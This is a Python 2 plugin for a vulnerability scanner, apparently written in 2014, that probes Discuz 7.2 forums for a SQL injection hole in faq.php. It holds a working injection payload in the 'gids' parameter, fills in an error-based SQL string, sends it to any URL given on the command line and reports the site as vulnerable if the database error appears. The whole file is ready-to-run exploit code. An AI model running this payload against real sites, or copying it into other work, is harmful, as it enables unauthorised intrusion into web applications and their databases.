#!/usr/bin/env python
# coding=utf-8

import sys

sys.path.append("/Users/imiyoo/workplace/tscanner/")

import re
from teye_web.http.URL import URL
from teye_web.util.error_sql import get_error_sql_key

# urllib2,requests,httplib2
from wCurl import wcurl

from teye_poc.PocScan import PocScan
from LogManager import log

import httplib

httplib.HTTPConnection.debuglevel = 1

from teye_data.vulnmanager import vm


class discuz_faq_sql(PocScan):
    '''
	'''

    def __init__(self):
        '''
		'''
        self._poc_info = {

            'w_hat': {
                'author': "imiyoo",
                'blog': "http://www.imiyoo.com",
                'team': "W.A.T",
                'create_time': "2014-11-21"
            },
            'w_vul': {
                'id': u"WID-2014-0002",
                'title': u"Discuz7.2 faq.php SQL注入漏洞",
                'method': u"GET",
                'tag': u"discuz",
                'rank': u"高危",
                'info': u"http://www.watscan.com/"
            }
        }

        self._vuln_file = "faq.php"

        self._vuln_param = "action=grouppermission&gids[10]=\\&gids[11][0]=)||{SQL}%23"

        # 扫描模式:0为域名模式检测，1为路径模式检测(检测用户输入的URL路径)
        self._scan_mode = 0

    def check(self, url):
        '''
		'''
        log.info(u"正在检测目标是否存在:[%s]..." % self.get_title())
        domain_path = url.get_domain_path()
        exp_url = domain_path.urljoin(self._vuln_file)
        error_sql, error_key = get_error_sql_key(type="floor")
        exp_params = self._vuln_param.replace("{SQL}", error_sql)
        res = wcurl.get(exp_url, params=exp_params)
        if self._find_vuln(res, error_key):
            self.security_hole(exp_url)

    def _find_vuln(self, res, key):
        '''
		'''
        body = res.body
        if body is None:
            return False

        if body.find(key) > 0:
            return True
        else:
            return False

    def get_name(self):
        '''
		'''
        return self.__class__.__name__


if __name__ == "__main__":
    from optparse import OptionParser

    usage = "usage: %prog [options] arg"
    parser = OptionParser(usage)
    parser.add_option("-u", "--url", action="store", dest="url", default=None, help="Scan the target url")
    (options, args) = parser.parse_args()
    if not options.url:
        parser.print_help()
        sys.exit(-1)
    else:
        url = options.url
        target_url = URL(url)
        check_inst = discuz_faq_sql()
        check_inst.check(target_url)
        print vm.get_all_vuln()
